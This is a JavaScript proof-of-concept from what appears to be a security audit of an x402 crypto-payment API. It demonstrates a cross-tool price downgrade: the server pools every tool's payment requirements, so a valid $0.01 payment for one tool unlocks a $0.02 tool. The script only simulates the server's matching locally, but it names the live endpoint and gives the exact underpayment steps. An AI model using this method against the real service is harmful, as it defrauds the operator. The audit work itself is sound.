#!/usr/bin/env node
/**
 * PoC — X402-01: cross-tool price downgrade via unbound requirement matching.
 *
 * SELF-CONTAINED. Imports NOTHING from src/. Re-implements the EXACT server-side
 * matching used by src/lib/x402.ts::verifyX402Payment:
 *   1. allReqs = ALL tools' pre-built requirements, flattened (x402.ts line 231)
 *   2. findMatchingRequirements: x402Version-2 path = deepEqual(req, payload.accepted)
 *      (verbatim from @x402/core dist server/index.mjs:632-647 + chunk deepEqual:52-75)
 *
 * The requirement objects below are reconstructed from:
 *   - the LIVE 402 body of POST https://api.algovault.com/x402/scan_funding_arb
 *     (endpoint-truth.md §3: amount "10000", asset 0x8335..2913, payTo 0x778A..7d59,
 *      network eip155:8453, extra {name:"USD Coin",version:"2"}, maxTimeoutSeconds 300)
 *   - src/lib/x402.ts TOOL_PRICING (get_trade_signal 0.02, scan_funding_arb 0.01,
 *     get_market_regime 0.02) → atomic = round(usd*1e6)
 *   - the SDK baseRequirements shape {scheme,network,amount,asset,payTo,
 *     maxTimeoutSeconds,extra} (server/index.mjs:322-334) — NO resource/tool field.
 *
 * THESIS: the matched requirement carries no tool identity. A $0.01 scan_funding_arb
 * proof deep-equals the $0.01 requirement no matter which route received it; the
 * HTTP route (x402-http-routes.ts:174) gates only on `tier==='x402' && pendingSettlement`
 * and never re-asserts amount==TOOL_PRICING[route]. isPaymentSufficient() (x402.ts:364)
 * is dead code (0 callers). Result: pay $0.01, receive the $0.02 get_trade_signal output.
 *
 * Run:  node audits/SECURITY-AUDIT-RECENT-FEATURES-W1/poc/x402-cross-tool-downgrade.mjs
 */

// ── SDK deepEqual, verbatim (chunk-TDLQZ6MP.mjs:52-75) ──
function deepEqual(obj1, obj2) {
  const normalize = (obj) => {
    if (obj === null || obj === undefined) return JSON.stringify(obj);
    if (typeof obj !== 'object') return JSON.stringify(obj);
    if (Array.isArray(obj)) {
      return JSON.stringify(obj.map((item) => (typeof item === 'object' && item !== null ? JSON.parse(normalize(item)) : item)));
    }
    const sorted = {};
    Object.keys(obj).sort().forEach((key) => {
      const value = obj[key];
      sorted[key] = typeof value === 'object' && value !== null ? JSON.parse(normalize(value)) : value;
    });
    return JSON.stringify(sorted);
  };
  try { return normalize(obj1) === normalize(obj2); }
  catch { return JSON.stringify(obj1) === JSON.stringify(obj2); }
}

// ── SDK findMatchingRequirements (server/index.mjs:632-647), x402Version 2 branch ──
function findMatchingRequirements(availableRequirements, paymentPayload) {
  if (paymentPayload.x402Version === 2) {
    return availableRequirements.find((req) => deepEqual(req, paymentPayload.accepted));
  }
  throw new Error('PoC only models x402Version 2');
}

// ── Reconstructed server requirements (one per TOOL_PRICING entry) ──
const USDC = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'; // canonical Base USDC
const PAYTO = '0x778A05280Fd8dB980E920fE9f31d0A8eAbD17d59'; // == X402_WALLET_ADDRESS
const NETWORK = 'eip155:8453'; // Base mainnet
const EXTRA = { name: 'USD Coin', version: '2' };
const atomic = (usd) => Math.round(usd * 1_000_000).toString();

const req = (usd) => ({
  scheme: 'exact',
  network: NETWORK,
  amount: atomic(usd),
  asset: USDC,
  payTo: PAYTO,
  maxTimeoutSeconds: 300,
  extra: EXTRA,
});

const TOOL_PRICING = { get_trade_signal: 0.02, scan_funding_arb: 0.01, get_market_regime: 0.02 };
const toolRequirements = new Map(Object.entries(TOOL_PRICING).map(([t, p]) => [t, [req(p)]]));

// x402.ts line 231: ALL tools flattened — NOT scoped to the requested route.
const allReqs = Array.from(toolRequirements.values()).flat();

// ── The attack: a VALID, correctly-signed $0.01 scan_funding_arb payment, copied
//    verbatim from the scan_funding_arb 402 the buyer legitimately fetched, then
//    POSTed to the /x402/get_trade_signal route ($0.02). The signature is valid
//    (it's a real scan_funding_arb authorization) so the facilitator's on-chain
//    verify PASSES — it only proves "this signer authorized 10000 atomic USDC to
//    payTo", which is true. Nothing ties it to the get_trade_signal route. ──
const cheapPayload = {
  x402Version: 2,
  accepted: req(0.01), // the $0.01 scan_funding_arb requirement, as the buyer's client copies it
  // (payload.payload would carry the real ERC-3009 signature — omitted; facilitator verifies it)
};

let pass = true;
const expect = (cond, label) => { console.log(`  ${cond ? 'PASS' : 'FAIL'}  ${label}`); pass = pass && cond; };

console.log('=== X402-01 PoC: cross-tool price downgrade ===\n');

console.log('[1] Server flattens ALL tool requirements into one matching pool (x402.ts:231):');
console.log('    allReqs amounts =', allReqs.map((r) => r.amount).join(', '), '(20000=$0.02, 10000=$0.01, 20000=$0.02)\n');

console.log('[2] Buyer submits a $0.01 (scan_funding_arb) proof to the /x402/get_trade_signal route ($0.02):');
const matched = findMatchingRequirements(allReqs, cheapPayload);
expect(!!matched, 'findMatchingRequirements RETURNS A MATCH for the $0.01 proof against the global pool');
expect(matched && matched.amount === '10000', `matched requirement amount is 10000 ($0.01), NOT 20000 ($0.02) — got ${matched?.amount}`);

console.log('\n[3] Route gate (x402-http-routes.ts:174) only checks tier==="x402" && pendingSettlement.');
console.log('    It NEVER asserts matched.amount === TOOL_PRICING["get_trade_signal"] (20000).');
const routePrice = TOOL_PRICING.get_trade_signal; // 0.02
const paidUsd = Number(matched.amount) / 1e6;     // 0.01
expect(paidUsd < routePrice, `paid $${paidUsd} < route price $${routePrice} — UNDERPAYMENT ACCEPTED (50% discount)`);

console.log('\n[4] The dead-code guard that WOULD have caught this:');
// isPaymentSufficient(tool, paidAmount) — x402.ts:364, 0 callers.
const isPaymentSufficient = (tool, paid) => paid !== undefined && TOOL_PRICING[tool] !== undefined && paid >= TOOL_PRICING[tool];
expect(isPaymentSufficient('get_trade_signal', paidUsd) === false,
  'isPaymentSufficient("get_trade_signal", 0.01) === false — it WOULD reject, but it is never called');

console.log('\n[5] The two $0.02 tools have byte-identical requirements (no tool identity in the object):');
expect(deepEqual(req(0.02), req(0.02)), 'get_trade_signal requirement === get_market_regime requirement (deepEqual)');

console.log('\n=== RESULT:', pass ? 'VULNERABILITY CONFIRMED — pay $0.01, receive $0.02 output ===' : 'inconclusive ===');
process.exit(pass ? 0 : 1);
